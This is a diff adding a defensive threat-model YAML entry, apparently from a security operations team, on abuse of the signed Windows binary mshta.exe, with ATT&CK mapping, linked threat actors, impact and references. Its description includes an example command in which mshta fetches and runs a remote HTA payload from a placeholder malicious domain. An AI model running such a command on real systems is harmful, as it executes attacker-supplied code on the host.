@@ -1,0 +1,89 @@
+name: Abuse of mshta
+criticality: High
+references:
+  public:
+    1: https://lolbas-project.github.io/lolbas/Binaries/Mshta/
+    2: https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
+    3: https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct
+    4: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
+    5: https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
+
+metadata:
+  uuid: 767f10bd-1947-44e3-b999-5fbf50d99027
+  schema: tvm::2.0
+  version: 1
+  created: 2025-01-09
+  modified: 2025-01-09
+  tlp: clear
+  organisation:
+    uuid: 56b0a0f0-b0bc-47d9-bb46-02f80ae2065a
+    name: EC DIGIT CSOC
+
+threat:
+  actors:
+    - name: att&ck::G0016 #[Enterprise] APT29, Blue Kitsune, Cozy Bear, CozyDuke, Dark Halo, IRON HEMLOCK, IRON RITUAL, Midnight Blizzard, NOBELIUM, NobleBaron, SolarStorm, The Dukes, UNC2452, UNC3524, YTTRIUM
+    - name: misp::2ee5ed7a-c4d0-40be-a837-20817474a15b #UNC2452, DarkHalo, StellarParticle, NOBELIUM, Solar Phoenix, Midnight Blizzard
+    - name: att&ck::G0102 #[Enterprise] Wizard Spider, DEV-0193, FIN12, GOLD BLACKBURN, Grim Spider, ITG23, Periwinkle Tempest, TEMP.MixMaster, UNC1878
+    - name: misp::3c2bb7d7-a085-4594-adc7-4a20cf724abb #UNC1878
+  killchain: Execution
+  att&ck:
+    - T1218.005 #System Binary Proxy Execution: Mshta
+  chaining:
+    - relation: atomicity::implements
+      vector: d5039f2c-9fcc-4ba3-ad6a-da8c891ba745 #Abuse Windows Utilities
+      description: |
+        This TVM is implementing the bigger TVM : Abuse of Windows Utilities
+  #cve:
+    #-
+  #misp:
+    #-
+  domains:
+    - Enterprise
+  terrain: |
+    Adversary must have at least user-level code execution privileges on a Windows host 
+    where Mshta is available to run.
+  targets:
+    - Workstations
+    - Public-Facing Servers
+    - Laptop
+  platforms:
+    - Windows
+    - Active Directory
+  severity: Significant incident
+  leverage:
+    - Spoofing
+    - Elevation of privilege
+    - Software installation
+  impact:
+    - Data Breach
+    - Reputational Damages
+    - Business disruption
+  viability: Likely
+  description: |
+    Mshta.exe is a legitimate Microsoft binary used for executing 
+    Microsoft HTML Application (HTA) files. Because mshta.exe is digitally signed 
+    by Microsoft, malicious actors often abuse it as a "Living off the Land" binary 
+    (LOLBin) to evade detection. Attackers can craft malicious HTA or VBScript code 
+    and pass it to mshta.exe, effectively bypassing many traditional endpoint 
+    security controls.  
+
+    Threat actors have leveraged mshta.exe to stealthily download and execute 
+    malicious payloads. By embedding or obfuscating their scripts within HTML 
+    or JavaScript code, adversaries can launch mshta.exe to pull additional 
+    malware from remote servers.  
+
+    Mshta.exe can also be invoked using command-line arguments that specify 
+    a remote or local HTA file. An example of such an abuse might look like:  
+    
+    ```bash
+    mshta.exe https://malicious[.]domain/payload.hta
+    ```
+    
+    or
+
+    ```bash
+    mshta.exe C:\Path\To\MaliciousScript.hta
+    ```
+
+    Once executed, mshta.exe runs with the same privileges as the invoking user 
+    (or higher, if misconfigurations or stolen credentials allow for elevated privileges).
